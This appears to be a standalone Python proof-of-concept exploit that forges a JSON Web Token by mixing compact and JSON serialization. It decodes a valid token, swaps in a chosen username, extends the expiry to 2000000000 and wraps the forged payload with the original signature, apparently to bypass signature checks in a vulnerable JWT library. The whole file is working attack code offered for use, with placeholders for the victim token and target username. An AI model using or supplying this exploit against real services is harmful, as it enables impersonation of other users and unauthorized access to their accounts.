from json import loads, dumps
from jwcrypto.common import base64url_decode, base64url_encode


def craft_forged_jwt_token(original_token):
    [header, payload, signature] = original_token.split('.')
    parsed_payload = loads(base64url_decode(payload))
    parsed_payload['username'] = 'TYPE YOUR USERNAME HERE'
    parsed_payload['exp'] = 2000000000
    fake_payload = base64url_encode(
        dumps(parsed_payload, separators=(',', ':')))
    forged_token = f'{{"  {header}.{fake_payload}.":"","protected":"{header}", "payload":"{payload}","signature":"{signature}"}}'
    print(forged_token)
    return forged_token


craft_forged_jwt_token("TYPE YOUR VALID JWT TOKEN HERE")
